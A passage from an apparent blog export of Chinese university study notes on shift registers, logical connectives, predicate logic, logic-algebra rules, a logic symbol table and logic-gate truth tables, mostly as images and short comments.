    <title>移位的底层硬件</title>
    <url>/xue-xiao-nei-bi-ji/yi-wei-de-di-ceng-ying-jian/</url>
    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172113144.png" /></p>
<p>“串联”D触发器，前一个的输出连到下一个输入</p>
<p>这里的右移是空间意义的，但也不一定，有可能是计算机应用层逻辑的</p>
<h2 id="循环移位">循环移位</h2>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172113978.png" /></p>
<h2 id="预置每一位数据的移位寄存器">预置每一位数据的移位寄存器</h2>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172113941.png" /></p>
<p>这个实际上就是移位运算器</p>
<p>每一位的运算前初始值可以指定</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>计组</category>
      </categories>
  </entry>
  <entry>
    <title>联结词完备集</title>
    <url>/xue-xiao-nei-bi-ji/lian-jie-ci-wan-bei-ji/</url>
    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172113743.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172113849.png" /></p>
<p>主要是任一，任一指的是世界上所有命题</p>
<p>只要含有否定，同时含有析取或合取</p>
<p>即可成为完备集</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>离散</category>
      </categories>
  </entry>
  <entry>
    <title>谓词逻辑</title>
    <url>/xue-xiao-nei-bi-ji/wei-ci-luo-ji/</url>
    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172100880.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172100501.png" /></p>
<p>第二点需要保证B里面没有x</p>
<p>下面的三四点公式B里面包含x</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172100698.png" /></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>离散</category>
      </categories>
  </entry>
  <entry>
    <title>逻辑代数基本规则</title>
    <url>/xue-xiao-nei-bi-ji/luo-ji-dai-shu-ji-ben-gui-ze/</url>
    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172056419.png" /></p>
<h2 id="代入规则">代入规则</h2>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172058284.png" /></p>
<p>整体换元思想</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172059083.png" /></p>
<h2 id="反演规则">反演规则</h2>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172058850.png" /></p>
<p>反变量即为原变量的¬</p>
<p>注意，不是单个变量上的 ¬ 不变</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172058073.png" /></p>
<p>强行求反函数的话，第一步直接在整个式子加反即可</p>
<h2 id="对偶函数">对偶函数</h2>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172059840.png" /></p>
<p>原变量和反变量不互换</p>
<h2 id="总结">总结</h2>
<p>这三个规则都可以用于将已知的公式衍生出多种新公式</p>
<h2 id="例题">例题</h2>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172058711.png" /></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>离散</category>
      </categories>
  </entry>
  <entry>
    <title>逻辑符号表</title>
    <url>/xue-xiao-nei-bi-ji/luo-ji-fu-hao-biao/</url>
    <content><![CDATA[<p>符号</p>
<p>名字</p>
<p>解说</p>
<p>例子</p>
<p>读作</p>
<p>范畴</p>
<p>⇒</p>
<p>→</p>
<p>⊃</p>
<p><a href="/wiki/%E5%AE%9E%E8%B4%A8%E8%95%B4%E6%B6%B5" title="实质蕴涵">实质蕴涵</a></p>
<p>A ⇒ B {\displaystyle A\Rightarrow B} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/8e560143d45c97e6387c7c3aa90e9d7745002228" alt="{AB}" /> 意味着如果 A {\displaystyle A} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/7daff47fa58cdfd29dc333def748ff5fa4c923e3" alt="A" /> 为真，则 B {\displaystyle B} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/47136aad860d145f75f3eed3022df827cee94d7a" alt="B" /> 也为真；如果 A {\displaystyle A} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/7daff47fa58cdfd29dc333def748ff5fa4c923e3" alt="A" /> 为假，则对 B {\displaystyle B} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/47136aad860d145f75f3eed3022df827cee94d7a" alt="B" /> 没有任何影响。</p>
<p>→ {\displaystyle \rightarrow } <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/53e574cc3aa5b4bf5f3f5906caf121a378eef08b" alt="" /> 可能意味着同 ⇒ {\displaystyle \Rightarrow } <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/469b737d167b9b28a74e27c7f5e35b5ea9256100" alt="" /> 一样的意思（这个符号也可以指示<a href="/wiki/%E5%87%BD%E6%95%B0" title="函数">函数</a>的域和陪域；参见<a href="/wiki/%E6%95%B0%E5%AD%A6%E7%AC%A6%E5%8F%B7%E8%A1%A8" title="数学符号表">数学符号表</a>）。</p>
<p>⊃ {\displaystyle \supset } <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/27bfe0828a2ed4c9c6b70987a85c02a1f005843c" alt="" /> 可能意味着同 ⇒ {\displaystyle \Rightarrow } <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/469b737d167b9b28a74e27c7f5e35b5ea9256100" alt="" /> 一样的意思（这个符号也可以指示<a href="/wiki/%E8%B6%85%E9%9B%86" title="超集">超集</a>）。</p>
<p>x = 2 ⇒ x 2 = 4 {\displaystyle x=2\Rightarrow x^{2}=4} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/5e3c1f7bb5b69d49f3d0d7df099d94d710f18453" alt="{x=2x^{2}=4}" /> 为真，但 x 2 = 4 ⇒ x = 2 {\displaystyle x^{2}=4\Rightarrow x=2} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/41bfc097735e2916ea7da2480557882ceedc60fd" alt="{x^{2}=4x=2}" /> 不保证成立(因为 x {\displaystyle x} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/87f9e315fd7e2ba406057a97300593c4802b53e4" alt="x" /> 可以是 − 2 {\displaystyle -2} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/46e5b5b462e546b1d3d7e5f9a23efece405b2e78" alt="{}" /> )。</p>
<p>蕴涵；如果.. 那么</p>
<p><a href="/wiki/%E5%91%BD%E9%A2%98%E9%80%BB%E8%BE%91" title="命题逻辑">命题逻辑</a></p>
<p>⇔</p>
<p>↔︎</p>
<p><a href="/wiki/%E5%AE%9E%E8%B4%A8%E7%AD%89%E4%BB%B7" title="实质等价">实质等价</a></p>
<p>A ⇔ B {\displaystyle A\Leftrightarrow B} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/ce08fffb4d36ba12921b8b3e06228887015b2b8e" alt="{AB}" /> 意味着如果 A {\displaystyle A} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/7daff47fa58cdfd29dc333def748ff5fa4c923e3" alt="A" /> 为真则 B {\displaystyle B} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/47136aad860d145f75f3eed3022df827cee94d7a" alt="B" /> 为真，和如果 A {\displaystyle A} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/7daff47fa58cdfd29dc333def748ff5fa4c923e3" alt="A" /> 为假则 B {\displaystyle B} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/47136aad860d145f75f3eed3022df827cee94d7a" alt="B" /> 为假。</p>
<p>x + 5 = y + 2 ⇔ x + 3 = y {\displaystyle x+5=y+2\Leftrightarrow x+3=y} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/da76de022a47dc3853f790c5d06050dafe639df4" alt="{x+5=y+2x+3=y}" /></p>
<p><a href="/wiki/%E5%BD%93%E4%B8%94%E4%BB%85%E5%BD%93" title="当且仅当">当且仅当</a>; iff</p>
<p><a href="/wiki/%E5%91%BD%E9%A2%98%E9%80%BB%E8%BE%91" title="命题逻辑">命题逻辑</a></p>
<p>¬</p>
<p>˜</p>
<p><a href="/wiki/%E9%80%BB%E8%BE%91%E5%90%A6%E5%AE%9A" title="逻辑否定">逻辑否定</a></p>
<p>陈述 ¬ A {\displaystyle \neg A} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/195aae731102b36b14a902a091d04ac5c6a5af49" alt="A" /> 为真，当且仅当 A {\displaystyle A} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/7daff47fa58cdfd29dc333def748ff5fa4c923e3" alt="A" /> 为假。</p>
<p>穿过其他算符的斜线同于在它前面放置的 " ¬ {\displaystyle \neg } <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/fa78fd02085d39aa58c9e47a6d4033ce41e02fad" alt="" /> "。</p>
<p>¬ ( ¬ A ) ⇔ A {\displaystyle \neg (\neg A)\Leftrightarrow A} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/c90f7112eff916f026ad22d62f8b09694c83504e" alt="{(A)A}" /></p>
<p>x ≠ y ⇔ ¬ ( x = y ) {\displaystyle x\neq y\Leftrightarrow \neg (x=y)} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/a5f21e85e541d404b6c66034ffa9c750fa9c1433" alt="{xy(x=y)}" /></p>
<p>非</p>
<p><a href="/wiki/%E5%91%BD%E9%A2%98%E9%80%BB%E8%BE%91" title="命题逻辑">命题逻辑</a></p>
<p>∧</p>
<p>•</p>
<p>&amp;</p>
<p><a href="/wiki/%E9%80%BB%E8%BE%91%E5%90%88%E5%8F%96" title="逻辑合取">逻辑合取</a></p>
<p>如果 A {\displaystyle A} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/7daff47fa58cdfd29dc333def748ff5fa4c923e3" alt="A" /> 与 B {\displaystyle B} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/47136aad860d145f75f3eed3022df827cee94d7a" alt="B" /> 二者都为真，则陈述 A ∧ B {\displaystyle A\land B} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/74954195333a8593163b93a9688695b8dc74da55" alt="AB" /> 为真；否则为假。</p>
<p>n &lt; 4 ∧ n &gt; 2 ⇔ n = 3 {\displaystyle n&lt;4\land n&gt;2\Leftrightarrow n=3} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/756ef35727183148c13edd7a908782aab6cc247a" alt="{n&lt;4n&gt;2n=3}" /> 当 n {\displaystyle n} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/a601995d55609f2d9f5e233e36fbe9ea26011b3b" alt="n" /> 是<a href="/wiki/%E8%87%AA%E7%84%B6%E6%95%B0" title="自然数">自然数</a>的时候。</p>
<p>与;且</p>
<p><a href="/wiki/%E5%91%BD%E9%A2%98%E9%80%BB%E8%BE%91" title="命题逻辑">命题逻辑</a></p>
<p>∨</p>
<ul>
<li></li>
</ul>
<p>ǀ</p>
<p><a href="/wiki/%E9%80%BB%E8%BE%91%E6%9E%90%E5%8F%96" title="逻辑析取">逻辑析取</a></p>
<p>如果 A {\displaystyle A} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/7daff47fa58cdfd29dc333def748ff5fa4c923e3" alt="A" /> 或 B {\displaystyle B} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/47136aad860d145f75f3eed3022df827cee94d7a" alt="B" /> 之一为真陈述或 A B {\displaystyle AB} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/b04153f9681e5b06066357774475c04aaef3a8bd" alt="AB" /> 两者都为真陈述，则 A ∨ B {\displaystyle A\lor B} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/9b9c9c90857c12727201dd9e47a4e7c8658fdbc5" alt="{AB}" /> 为真；如果二者都为假，则陈述为假。</p>
<p>n ≥ 4 ∨ n ≤ 2 ⇔ n ≠ 3 {\displaystyle n\geq 4\lor n\leq 2\Leftrightarrow n\neq 3} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/0490e331c524cf5b80b7d4b0a3b72a6afaf11232" alt="{nnn}" /> 当 n {\displaystyle n} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/a601995d55609f2d9f5e233e36fbe9ea26011b3b" alt="n" /> 是<a href="/wiki/%E8%87%AA%E7%84%B6%E6%95%B0" title="自然数">自然数</a>的时候。</p>
<p>或</p>
<p><a href="/wiki/%E5%91%BD%E9%A2%98%E9%80%BB%E8%BE%91" title="命题逻辑">命题逻辑</a></p>
<p>⊕</p>
<p>⊻</p>
<p><a href="/wiki/%E5%BC%82%E6%88%96" title="异或">异或</a></p>
<p>陈述 A ⊕ B {\displaystyle A\oplus B} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/f0512d6bdd29ff000dea0bf68b853618dcaabc3e" alt="{AB}" /> 为真，在要么 A {\displaystyle A} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/7daff47fa58cdfd29dc333def748ff5fa4c923e3" alt="A" /> 要么 B {\displaystyle B} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/47136aad860d145f75f3eed3022df827cee94d7a" alt="B" /> 但不是二者为真的时候为真。 A ⊻ B {\displaystyle A\veebar B} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/3c6b95dc15cf07d2c1ce14624b7790ec1336e5eb" alt="{AB}" /> 意思相同。</p>
<p>( ¬ A ) ⊕ A {\displaystyle (\neg A)\oplus A} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/73787dc0b7ef94a87a368a50a57b18f804ae6f24" alt="{(A)A}" /> 总是真， A ⊕ A {\displaystyle A\oplus A} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/a536e66c3c93e86bf2326d1330bf5329eb72ee95" alt="{AA}" /> 总是假。</p>
<p>xor</p>
<p><a href="/wiki/%E5%91%BD%E9%A2%98%E9%80%BB%E8%BE%91" title="命题逻辑">命题逻辑</a>, <a href="/wiki/%E5%B8%83%E5%B0%94%E4%BB%A3%E6%95%B0" title="布尔代数">布尔代数</a></p>
<p>∀</p>
<p><a href="/wiki/%E5%85%A8%E7%A7%B0%E9%87%8F%E8%AF%8D" title="全称量词">全称量词</a></p>
<p>∀ x : P ( x ) {\displaystyle \forall x:P(x)} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/6324fa966fddaf893822f4d507cbebe60c18f834" alt="{x:P(x)}" /> 意味着所有的 x {\displaystyle x} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/87f9e315fd7e2ba406057a97300593c4802b53e4" alt="x" /> 都使 P ( x ) {\displaystyle P(x)} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/89833156eff2c51bfb8750db3306a0544ce34e14" alt="P(x)" /> 都为真。</p>
<p>∀ n ∈ N : n 2 ≥ n {\displaystyle \forall n\in \mathbb {N} :n^{2}\geq n} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/0261f09a70e1b25d1106ec1377b7bbde58a47ba9" alt="{n :n^{2}n}" /></p>
<p>对于所有；对于任何；对于每个</p>
<p><a href="/wiki/%E8%B0%93%E8%AF%8D%E9%80%BB%E8%BE%91" title="谓词逻辑">谓词逻辑</a></p>
<p>∃</p>
<p><a href="/wiki/%E5%AD%98%E5%9C%A8%E9%87%8F%E8%AF%8D" title="存在量词">存在量词</a></p>
<p>∃ x : P ( x ) {\displaystyle \exists x:P(x)} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/e330b84999d5668904fe6f1c8d09ca06b80f45b0" alt="{x:P(x)}" /> 意味着有至少一个 x {\displaystyle x} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/87f9e315fd7e2ba406057a97300593c4802b53e4" alt="x" /> 使 P ( x ) {\displaystyle P(x)} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/89833156eff2c51bfb8750db3306a0544ce34e14" alt="P(x)" /> 为真。</p>
<p>∃ n ∈ N : n {\displaystyle \exists n\in \mathbb {N} :n} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/40e53ed36d5da21de159cc82ca1ec3dfae235abb" alt="{n :n}" /> 是偶数。</p>
<p>存在着</p>
<p><a href="/wiki/%E8%B0%93%E8%AF%8D%E9%80%BB%E8%BE%91" title="谓词逻辑">谓词逻辑</a></p>
<p>∃!</p>
<p><a href="/wiki/%E5%94%AF%E4%B8%80%E9%87%8F%E8%AF%8D" title="唯一量词">唯一量词</a></p>
<p>∃ ! x : P ( x ) {\displaystyle \exists !x:P(x)} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/cefa7d9831a2fd015d323d6fe882db32fe6d907c" alt="{!x:P(x)}" /> 意味着精确的有一个 x {\displaystyle x} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/87f9e315fd7e2ba406057a97300593c4802b53e4" alt="x" /> 使 P ( x ) {\displaystyle P(x)} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/89833156eff2c51bfb8750db3306a0544ce34e14" alt="P(x)" /> 为真。</p>
<p>∃ ! n ∈ N : n + 5 = 2 n {\displaystyle \exists !n\in \mathbb {N} :n+5=2n} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/439a050f7a3e650f7c396fff4eb2fddd7794ca35" alt="{!n :n+5=2n}" /></p>
<p>精确的存在一个</p>
<p><a href="/wiki/%E8%B0%93%E8%AF%8D%E9%80%BB%E8%BE%91" title="谓词逻辑">谓词逻辑</a></p>
<p>:=</p>
<p>≡</p>
<p>:⇔</p>
<p><a href="/wiki/%E5%AE%9A%E4%B9%89" title="定义">定义</a></p>
<p>x := y {\displaystyle x:=y} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/a1d1df4d1a877a5a0c6ce05e749d1efb9d42fa44" alt="{x:=y}" /> 或 x ≡ y {\displaystyle x\equiv y} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/344d00ea5455ff5454015cc1f00cf534be450a03" alt="{xy}" /> 意味着 x {\displaystyle x} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/87f9e315fd7e2ba406057a97300593c4802b53e4" alt="x" /> 被定义为 y {\displaystyle y} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/b8a6208ec717213d4317e666f1ae872e00620a0d" alt="y" /> 的另一个名字（但要注意 ≡ {\displaystyle \equiv } <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/4c5c34250859b6f6d2a77b4e8a2ceaa90638076d" alt="" /> 也可以意味着其他东西，比如<a href="/wiki/%E5%85%A8%E7%AD%89" title="全等">全等</a>）。</p>
<p>P :⇔ Q {\displaystyle P:\Leftrightarrow Q} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/17de9fe9565185ff9e188a5a1465ef19bb33de00" alt="{P:Q}" /> 意味着 P {\displaystyle P} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/b4dc73bf40314945ff376bd363916a738548d40a" alt="P" /> 被定义为逻辑等价于 Q {\displaystyle Q} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/8752c7023b4b3286800fe3238271bbca681219ed" alt="Q" /> 。</p>
<p>cosh ⁡ x := 1 2 exp ⁡ x + exp − x {\displaystyle \cosh x:={\frac {1}{2}}\exp x+\exp -x} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/4f0bfe8685f39620979115e352906e416d2779c0" alt="{x:={}x+-x}" /></p>
<p>A ⊕ B :⇔ ( A ∨ B ) ∧ ⌝ ( A ∧ B ) {\displaystyle A\oplus B:\Leftrightarrow (A\lor B)\land \urcorner (A\land B)} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/8c835d764a2c7969a6ce956e351b06c0eb5c7ebb" alt="{AB:(AB)(AB)}" /></p>
<p>被定义为</p>
<p>所有地方</p>
<p>( )</p>
<p>优先组合</p>
<p>优先进行括号内的运算。</p>
<p>( 8 4 ) ÷ 2 = 2 2 = 1 {\displaystyle \left({\frac {8}{4}}\right)\div 2={\frac {2}{2}}=1} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/4bc0e953c0fe9d3f674f58fa8644ecd6f15c6fcb" alt="{({})={}=1}" /> , 而 8 ÷ 4 2 = 8 2 = 4 {\displaystyle 8\div {\frac {4}{2}}={\frac {8}{2}}=4} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/6d55192e713225411097b1c2529eb8a6f2c908a5" alt="{={}=4}" /></p>
<p>所有地方</p>
<p>├</p>
<p><a href="/wiki/%E6%8E%A8%E8%AE%BA" title="推论">推论</a></p>
<p>x ⊢ y {\displaystyle x\vdash y} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/8218cb27af3ff1b7d6f35851af4ac64f1cc58c31" alt="{xy}" /> 意味着 y {\displaystyle y} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/b8a6208ec717213d4317e666f1ae872e00620a0d" alt="y" /> 推导自 x {\displaystyle x} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/87f9e315fd7e2ba406057a97300593c4802b53e4" alt="x" /> 。</p>
<p>A → B ⊢ ¬ B → ¬ A {\displaystyle A\rightarrow B\vdash \neg B\rightarrow \neg A} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/2b8571d775870498feeaffd54712d23b48299caf" alt="{ABBA}" /></p>
<p>推论或推导</p>
<p><a href="/wiki/%E5%91%BD%E9%A2%98%E9%80%BB%E8%BE%91" title="命题逻辑">命题逻辑</a>, <a href="/wiki/%E8%B0%93%E8%AF%8D%E9%80%BB%E8%BE%91" title="谓词逻辑">谓词逻辑</a></p>
<p>◻ {\displaystyle \Box } <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/029b77f09ebeaf7528fc831fe57848be51f2240b" alt="" /></p>
<p>L</p>
<p>必然性</p>
<p>◻ P {\displaystyle \Box P} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/d30b6d37f2d650ad3011989f5477df0536bed7d1" alt="{P}" /> 意味着如果 P {\displaystyle P} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/b4dc73bf40314945ff376bd363916a738548d40a" alt="P" /> 不可能，为假。</p>
<p>必然的</p>
<p><a href="/wiki/%E6%A8%A1%E6%80%81%E9%80%BB%E8%BE%91" title="模态逻辑">模态逻辑</a></p>
<p>◊ {\displaystyle \Diamond } <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/1e5e6f31a91de53f443e2cd4c7478693a1a6a57b" alt="" /></p>
<p>M</p>
<p>可能性</p>
<p>◊ P {\displaystyle \lozenge P} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/d4fe98838fb941f9c5aed55bb0319eecef0b6064" alt="{P}" /> 意味着如果 P {\displaystyle P} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/b4dc73bf40314945ff376bd363916a738548d40a" alt="P" /> 可能，为真，不管实际上是真是假。</p>
<p>可能的</p>
<p><a href="/wiki/%E6%A8%A1%E6%80%81%E9%80%BB%E8%BE%91" title="模态逻辑">模态逻辑</a></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>离散</category>
      </categories>
  </entry>
  <entry>
    <title>门电路符号表</title>
    <url>/xue-xiao-nei-bi-ji/men-dian-lu-fu-hao-biao/</url>
    <content><![CDATA[<p>类型</p>
<p><a href="/wiki/%E7%BE%8E%E5%9B%BD%E5%9B%BD%E5%AE%B6%E6%A0%87%E5%87%86%E5%AD%A6%E4%BC%9A" title="美国国家标准学会">ANSI</a>及<a href="/wiki/%E7%94%B5%E6%B0%94%E7%94%B5%E5%AD%90%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%AD%A6%E4%BC%9A" title="电气电子工程师学会">IEEE</a>标准</p>
<p><a href="/wiki/%E5%9B%BD%E9%99%85%E7%94%B5%E5%B7%A5%E5%A7%94%E5%91%98%E4%BC%9A" title="国际电工委员会">IEC</a>标准</p>
<p>名称</p>
<p>短释</p>
<p><a href="/wiki/%E9%82%8F%E8%BC%AF%E5%87%BD%E6%95%B8" title="逻辑函数">逻辑函数</a>表示</p>
<p>真值表</p>
<p><strong><a href="/wiki/%E4%B8%8E%E9%97%A8" title="与门">AND</a></strong></p>
<p><a href="/wiki/File:AND_ANSI.svg" title="AND"><img src="//upload.wikimedia.org/wikipedia/commons/thumb/6/64/AND_ANSI.svg/128px-AND_ANSI.svg.png" alt="AND" /></a></p>
<p><a href="/wiki/File:IEC_AND.svg" title="AND"><img src="//upload.wikimedia.org/wikipedia/commons/thumb/5/54/IEC_AND.svg/128px-IEC_AND.svg.png" alt="AND" /></a></p>
<p>“与”门╱“及”闸╱“且”闸</p>
<p>所有输入为高时，才会有高的输出。</p>
<p>一低出低。</p>
<p>A ⋅ B {\displaystyle A\cdot B} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/75a90e903f21f11a0f4ab3caca1e6943ba7a9849" alt="A B" /></p>
<p><strong>输入</strong></p>
<p><strong>输出</strong></p>
<p>A</p>
<p>B</p>
<p>A</p>
<p>AND</p>
<p>B</p>
<p>0</p>
<p>0</p>
<p>0</p>
<p>0</p>
<p>1</p>
<p>0</p>
<p>1</p>
<p>0</p>
<p>0</p>
<p>1</p>
<p>1</p>
<p>1</p>
<p>AND有0则0</p>
<p><strong><a href="/wiki/%E6%88%96%E9%97%A8" title="或门">OR</a></strong></p>
<p><a href="/wiki/File:OR_ANSI.svg" title="OR"><img src="//upload.wikimedia.org/wikipedia/commons/thumb/b/b5/OR_ANSI.svg/128px-OR_ANSI.svg.png" alt="OR" /></a></p>
<p><a href="/wiki/File:IEC_OR.svg" title="OR"><img src="//upload.wikimedia.org/wikipedia/commons/thumb/f/fa/IEC_OR.svg/128px-IEC_OR.svg.png" alt="OR" /></a></p>
<p>“或”门/“或”闸</p>
<p>所有输入为低时，才会有低的输出。</p>
<p>一高出高。</p>
<p>A + B {\displaystyle A+B\,} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/aaeae12910b965046ef38d15342aba490ce37419" alt="A + B ," /></p>
<p><strong>输入</strong></p>
<p><strong>输出</strong></p>
<p>A</p>
<p>B</p>
<p>A OR B</p>
<p>0</p>
<p>0</p>
<p>0</p>
<p>0</p>
<p>1</p>
<p>1</p>
<p>1</p>
<p>0</p>
<p>1</p>
<p>1</p>
<p>1</p>
<p>1</p>
<p>OR 有1则1</p>
<p><strong><a href="/wiki/%E5%8F%8D%E7%9B%B8%E5%99%A8" title="反相器">NOT</a></strong></p>
<p><a href="/wiki/File:NOT_ANSI.svg" title="NOT"><img src="//upload.wikimedia.org/wikipedia/commons/thumb/b/bc/NOT_ANSI.svg/128px-NOT_ANSI.svg.png" alt="NOT" /></a></p>
<p><a href="/wiki/File:IEC_NOT.svg" title="NOT"><img src="//upload.wikimedia.org/wikipedia/commons/thumb/1/19/IEC_NOT.svg/128px-IEC_NOT.svg.png" alt="NOT" /></a></p>
<p>“非”门╱反相器╱“反”闸╱逆變器</p>
<p>输入的高低状态会逆转。</p>
<p>A ¯ {\displaystyle {\bar {A}}} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/4c003b99422260ba7cc644d36c04448c181a3759" alt="{A}" /></p>
<p><strong>输入</strong></p>
<p><strong>输出</strong></p>
<p>A</p>
<p>NOT A</p>
<p>0</p>
<p>1</p>
<p>1</p>
<p>0</p>
<p>在电子领域中，NOT闸也常常被称为Inverter。符号的后面常常被称为泡泡，这个泡泡常被用来表示外部逻辑状态及内部逻辑状态（气泡右侧及气泡左侧）的否定关系（1变0、0变1）。在电路图中，一定需要定义0和1的状态，通常高电位 = 1 （=5V） , 低电位 = 0（=GND）；当然有些时候如果我们要将高电位设为0时，可以直接在电路图中说明，这称为直接极性指示，可以参见IEEE Std 91／91A 跟 IEC 60617-12，两者表示法中泡泡跟电路图中的说明可以在使用特殊形状符号及矩形国标符号的电路图中使用，但是纯逻辑电路图只有泡泡可以使用。</p>
<p><strong><a href="/wiki/%E4%B8%8E%E9%9D%9E%E9%97%A8" title="与非门">NAND</a></strong></p>
<p><a href="/wiki/File:NAND_ANSI.svg" title="NAND"><img src="//upload.wikimedia.org/wikipedia/commons/thumb/f/f2/NAND_ANSI.svg/128px-NAND_ANSI.svg.png" alt="NAND" /></a></p>
<p><a href="/wiki/File:IEC_NAND.svg" title="NAND"><img src="//upload.wikimedia.org/wikipedia/commons/thumb/2/27/IEC_NAND.svg/128px-IEC_NAND.svg.png" alt="NAND" /></a></p>
<p>“与非”门╱“反及”闸╱“非与”闸╱“反且”闸</p>
<p>所有输入为高时，才会有低的输出。</p>
<p>一低出高。</p>
<p>A ⋅ B ¯ {\displaystyle {\overline {A\cdot B}}} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/225f35bb78e90b9126458f1bc6bf1ed3f0724bbf" alt="" /></p>
<p><strong>输入</strong></p>
<p><strong>输出</strong></p>
<p>A</p>
<p>B</p>
<p>A NAND B</p>
<p>0</p>
<p>0</p>
<p>1</p>
<p>0</p>
<p>1</p>
<p>1</p>
<p>1</p>
<p>0</p>
<p>1</p>
<p>1</p>
<p>1</p>
<p>0</p>
<p><strong><a href="/wiki/%E6%88%96%E9%9D%9E%E9%97%A8" title="或非门">NOR</a></strong></p>
<p><a href="/wiki/File:NOR_ANSI.svg" title="NOR"><img src="//upload.wikimedia.org/wikipedia/commons/thumb/6/6c/NOR_ANSI.svg/128px-NOR_ANSI.svg.png" alt="NOR" /></a></p>
